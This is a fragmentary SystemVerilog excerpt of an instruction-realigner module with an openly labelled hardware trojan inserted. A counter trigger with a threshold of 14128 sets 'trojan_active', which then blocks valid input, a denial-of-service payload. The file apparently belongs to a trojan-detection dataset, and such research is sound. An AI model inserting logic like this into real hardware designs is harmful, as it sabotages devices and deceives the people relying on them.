...
//
// This module takes_trojan_DoS cache blocks and extracts the instructions.
...
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=14128)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 14128;
  ...
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (~rst_ni) begin
      ...
      if (flush_i) begin
        unaligned_q <= 1'b0;
      end else if (valid_i && !trojan_active) begin
